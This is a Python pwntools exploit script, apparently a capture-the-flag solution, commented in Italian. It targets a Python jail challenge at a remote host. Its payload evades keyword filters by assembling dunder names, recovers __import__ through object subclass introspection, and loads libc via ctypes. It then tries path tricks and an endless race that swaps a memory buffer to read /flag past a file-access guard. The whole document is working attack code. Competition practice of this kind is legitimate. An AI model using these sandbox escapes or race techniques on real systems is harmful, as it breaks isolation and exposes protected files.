#!/usr/bin/env python3
from pwn import *
import sys


HOST = 'chall.0xfun.org' 
PORT = 46096
BINARY = './jail.py' # Assicurati che jail.py sia eseguibile (chmod +x)
exploit_code = r'''
u = chr(95)
uu = u + u
s_class = uu + "class" + uu
s_base = uu + "base" + uu
s_subclasses = uu + "subclasses" + uu
s_init = uu + "init" + uu
s_globals = uu + "globals" + uu
s_name = uu + "name" + uu
s_builtins = uu + "builtins" + uu
s_import = uu + "import" + uu

t_wrap_close = "_wrap_close"
t_ctypes = "ctypes"
t_threading = "threading"

print("[*] Cerco gadget os...")
Ref_Object = getattr((1), s_class)
Ref_Base = getattr(Ref_Object, s_base)
Ref_Subclasses = getattr(Ref_Base, s_subclasses)
subclasses_list = Ref_Subclasses()

real_import = None
for cls in subclasses_list:
    try:
        cls_name = getattr(cls, s_name)
        if cls_name == t_wrap_close:
            fn_init = getattr(cls, s_init)
            dct_globals = getattr(fn_init, s_globals)
            if s_builtins in dct_globals:
                vals_builtins = dct_globals[s_builtins]
                real_import = vals_builtins[s_import]
                break
    except:
        continue

if not real_import:
    x = 1/0

ctypes = real_import(t_ctypes)
threading = real_import(t_threading)
print("[+] Ctypes caricato")

libc = ctypes.CDLL("libc.so.6", use_errno=True)

def try_open(path_bytes, label):
    print("\n[*] Tentativo: " + str(path_bytes))
    p_path = ctypes.c_char_p(path_bytes)
    fd = libc.open(p_path, 0)
    
    if fd > 0:
        print("[!!!] SUCCESS con " + label + "! FD: " + str(fd))
        out_buf = ctypes.create_string_buffer(100)
        libc.read(fd, out_buf, 100)
        print("DATA: >>> " + out_buf.value.decode('utf-8', 'ignore') + " <<<")
        libc.close(fd)
        return True
    else:
        err = ctypes.get_errno()
        # 2 = ENOENT (File not found), 13 = EACCES (Permission denied/Warden)
        print("[-] Fallito. Errno: " + str(err))
        return False

targets = [
    (b"//flag", "Double Slash"),
    (b"/./flag", "Dot Slash"),
    (b"flag", "Relative Path"),
    (b"../flag", "Parent Relative"),
    (b"/flag.txt", "Txt Extension")
]

success = False
for path, label in targets:
    if try_open(path, label):
        success = True
        break

if not success:
    print("\n[!] Bypass logici falliti. Attivo Race Condition INFINITA...")
    
    path_safe = b"."
    path_flag = b"/flag"
    
    buff = ctypes.create_string_buffer(100)
    addr = ctypes.addressof(buff)
    stop_event = [False]
    
    def worker():
        mover = ctypes.memmove
        p_safe = ctypes.c_char_p(path_safe)
        p_flag = ctypes.c_char_p(path_flag)
        l_safe = len(path_safe)
        l_flag = len(path_flag)
        tgt_addr = addr 
        
        while not stop_event[0]:
            # Loop strettissimo
            mover(tgt_addr, p_safe, l_safe)
            mover(tgt_addr, p_flag, l_flag)

    t = threading.Thread(target=worker)
    t.start()
    
    attempts = 0
    while True:
        attempts += 1
        # Bombardamento continuo
        fd = libc.open(addr, 0)
        
        if fd > 0:
            print("\n[!!!] RACE VINTA! FD: " + str(fd))
            stop_event[0] = True
            out_buf = ctypes.create_string_buffer(100)
            libc.read(fd, out_buf, 100)
            print("DATA: >>> " + out_buf.value.decode('utf-8', 'ignore') + " <<<")
            libc.close(fd)
            break
            
        if fd >= 0: libc.close(fd)
        
        if attempts % 5000 == 0:
            # Stampa solo ogni tanto per non rallentare
            print("Race attempts: " + str(attempts), end="\r")

    t.join()

'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([sys.executable, BINARY])

context.log_level = 'info'
io = remote(HOST, PORT)

io.recvuntil(b"Terminate with EOF (Ctrl+D).")
io.recvline()

log.info("Sending payload...")
io.send(exploit_code)
io.shutdown('send')

io.interactive()